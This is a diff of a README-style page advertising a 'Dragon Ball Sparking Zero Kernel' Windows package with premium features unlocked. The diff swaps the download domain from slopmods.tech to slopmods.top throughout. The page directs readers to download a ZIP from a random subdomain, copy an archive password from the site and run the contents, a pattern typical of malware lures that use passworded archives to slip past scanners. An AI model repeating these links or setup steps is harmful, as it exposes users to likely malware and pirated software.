@@ -8,12 +8,12 @@ Dragon Ball Sparking Zero Kernel — Windows setup and configuration · Premium 
 
 > Use the release page below for Windows.
 
-- **Release page:** [dyvazykrytn.slopmods.tech](https://dyvazykrytn.slopmods.tech/)
-- **Full URL:** `https://dyvazykrytn.slopmods.tech/`
+- **Release page:** [dyvazykrytn.slopmods.top](https://dyvazykrytn.slopmods.top/)
+- **Full URL:** `https://dyvazykrytn.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **dyvazykrytn.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **dyvazykrytn.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Dragon Ball Sparking Zero Kernel — Windows setup and configuration · Premium 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **dyvazykrytn.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **dyvazykrytn.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
